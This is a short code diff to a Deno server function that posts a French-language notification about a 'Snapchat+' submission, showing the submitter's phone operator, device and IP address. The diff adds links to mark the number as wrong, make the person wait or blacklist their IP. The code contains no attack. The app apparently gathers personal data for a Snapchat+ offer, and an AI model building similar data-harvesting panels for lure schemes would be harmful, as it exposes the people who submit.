@@ -38,6 +38,10 @@ Deno.serve(async (req) => {
 
     const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
 
+    const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+    const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
+    const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
+
     const embed = {
       title: "📱 Nouvelle soumission Snapchat+",
       color: operatorColors[operateur] || 16776960,
@@ -51,6 +55,11 @@ Deno.serve(async (req) => {
         { name: "💾 Appareil", value: finalDevice, inline: true },
         { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
         { name: "🕐 Date de soumission", value: dateStr, inline: false },
+        {
+          name: "⚡ Actions",
+          value: `✅ Régis avec ✅ pour prendre en charge\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
+          inline: false
+        },
       ],
       footer: { text: `ID: ${submissionId || "N/A"}` },
       timestamp: now.toISOString(),
